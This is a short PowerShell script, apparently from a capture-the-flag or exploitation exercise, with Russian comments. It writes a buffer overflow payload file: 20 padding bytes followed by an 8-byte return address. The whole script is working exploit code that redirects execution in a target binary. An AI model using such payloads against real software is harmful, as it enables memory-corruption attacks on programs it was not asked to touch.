# make_payload.ps1
$addr = [uint64]0x1400015c7
$bytes = [System.BitConverter]::GetBytes($addr)
$out = [byte[]]::new(28)

# 20 байт мусора ('A')
for($i=0; $i -lt 20; $i++) { $out[$i] = 0x41 }

# 8 байт адреса
for($i=0; $i -lt 8; $i++) { $out[20+$i] = $bytes[$i] }

# Сохранение
[System.IO.File]::WriteAllBytes("payload.bin", $out)
Write-Host "[+] payload.bin creatred! size: $($out.Length) byte"